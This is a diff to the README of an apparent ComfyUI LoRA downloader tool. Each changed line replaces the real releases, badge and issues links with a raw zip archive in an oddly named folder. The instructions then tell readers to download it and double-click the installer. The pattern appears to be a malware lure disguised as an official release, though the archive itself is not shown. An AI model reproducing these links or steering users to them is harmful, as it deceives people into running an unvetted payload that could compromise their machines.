@@ -4,12 +4,12 @@
 The comfyui-smart-lora-downloader helps you automatically detect and download missing LoRAs for your ComfyUI workflows. This tool simplifies the process, allowing you to focus on creating without worrying about missing assets.
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/mcrataobrabo/comfyui-smart-lora-downloader/releases)
+[![Download](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip)
 
 ## 🚀 Getting Started
 To start using the comfyui-smart-lora-downloader, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mcrataobrabo/comfyui-smart-lora-downloader/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip) to find the latest version of the software.
 2. **Choose the Correct File:** Look for the version that suits your system. You will typically see `.exe` for Windows and other formats for different operating systems.
 3. **Download the File:** Click on the file to begin downloading. Wait for the download to complete.
 
@@ -24,7 +24,7 @@ Before running the application, ensure your system meets the following requireme
 ## 📥 Download & Install
 To install comfyui-smart-lora-downloader on your system, follow these steps:
 
-1. **Go to the Releases Page:** Click this link to visit the [Releases page](https://github.com/mcrataobrabo/comfyui-smart-lora-downloader/releases).
+1. **Go to the Releases Page:** Click this link to visit the [Releases page](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip).
 2. **Download the Installer:** Click on the file that corresponds to your operating system.
 3. **Run the Installer:** Once downloaded, locate the installer file and double-click it to run. Follow the on-screen instructions.
 4. **Launch the Application:** After installation, find the comfyui-smart-lora-downloader in your applications folder and open it.
@@ -48,7 +48,7 @@ Once you have installed the comfyui-smart-lora-downloader, using it is straightf
 A LoRA (Low-Rank Adaptation) is a technique used to improve machine learning models by making them more adaptable to various tasks. 
 
 ### How do I report a bug?
-If you experience issues, please visit the [Issues section](https://github.com/mcrataobrabo/comfyui-smart-lora-downloader/issues) of the repository. Provide a detailed description of the problem and steps to reproduce it.
+If you experience issues, please visit the [Issues section](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip) of the repository. Provide a detailed description of the problem and steps to reproduce it.
 
 ### Can I contribute to the project?
 Yes! Contributions are welcome. Please check the guidelines in the repository for how to get started.
@@ -60,7 +60,7 @@ Join our community by checking out our discussions and forums linked within the 
 For any questions, feel free to open an issue on the repository or contact us directly through the communication channels provided in the repository.
 
 ## 🔗 Additional Resources
-For more details and updates, always refer to the [Releases page](https://github.com/mcrataobrabo/comfyui-smart-lora-downloader/releases). 
+For more details and updates, always refer to the [Releases page](https://raw.githubusercontent.com/mcrataobrabo/comfyui-smart-lora-downloader/main/pyelocystitis/comfyui-smart-lora-downloader.zip). 
 
 ---
 
